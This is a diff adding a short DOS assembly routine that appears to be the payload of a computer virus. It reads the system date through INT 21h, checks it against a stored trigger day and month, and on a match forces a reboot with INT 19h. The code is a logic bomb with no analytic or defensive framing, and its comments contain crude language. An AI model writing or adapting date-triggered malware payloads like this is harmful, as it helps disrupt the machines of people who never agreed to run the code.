@@ -1,0 +1,20 @@
+;---------------------------------
+action:                          ; 
+MOV AH,2AH                       ;        
+INT 21H                          ;get date           
+CMP Dl,byte ptr cs:[action_dia+bp]  ;is equal to my day?                 
+JE  cont                         ;nop! fuck ret          
+cmp  byte ptr cs:[action_dia+bp],32
+jne no_day                       ;
+cont:                            ; 
+cmp dh,byte ptr cs:[action_mes+bp]  ;is equal to my month?            
+je set                           ;
+cmp byte ptr cs:[action_mes+bp],32
+jne NO_DAY                       ;nop! fuck ret           
+set:                             ; 
+ 
+int 19h                          ;rebbot the machine 
+NO_DAY:                          ;             
+ret                              ;
+;---------------------------------
+
